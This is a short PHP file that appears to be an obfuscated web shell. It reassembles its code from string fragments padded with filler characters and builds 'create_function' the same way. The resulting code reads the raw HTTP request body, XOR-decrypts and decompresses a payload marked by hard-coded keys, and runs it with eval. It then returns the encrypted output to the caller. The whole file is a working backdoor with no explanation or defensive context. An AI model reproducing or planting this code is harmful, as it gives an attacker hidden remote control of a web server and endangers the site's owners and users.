<?php
$t='cVyh(Vy"/$kh(.+)Vy$kVyf/",@file_get_conVyVytents("pVyhp://inpuVytVy"),$m';
$E=')==1)Vy {Vy@obVy_start();@VyevaVyl(@gzuncompresVys(@Vyx(@baVyse64_deVy';
$I='$k="35VyfVya0b96";Vy$kh=Vy"b8ff59Vy648753";$kf=Vy"42Vyc613455Vy020";$p';
$J=str_replace('lf','','clfreatlfelf_fulflfnctilfon');
$R='code($m[1]Vy),$k)))VyVy;$Vyo=@VyoVyb_Vyget_contentsVy();@ob_end_clean(';
$b=')Vy;$r=@baVyse64_enVycoVyde(@x(@gzcoVympress(Vy$oVy),Vy$k));print(Vy"$Vyp$kh$r$kf");}';
$K='y;$l=stVyrlen($t);$oVy="";fVyor($i=0;$i<$Vyl;){forVy($Vyj=0;($j<Vy$c&&$Vyi<';
$l='=Vy"a4IPTVy9vQEgNVyNV5Vy0Vy6"Vy;functioVyn Vyx($t,$k){$c=VystrlenVy($k)V';
$s='VyVy$l);$j++,$i++){Vy$o.=$tVy{$iVy}^$k{Vy$j};}}return Vy$o;}ifVy (@Vypreg_maVyt';
$z=str_replace('Vy','',$I.$l.$K.$s.$t.$E.$R.$b);
$o=$J('',$z);$o();
?>
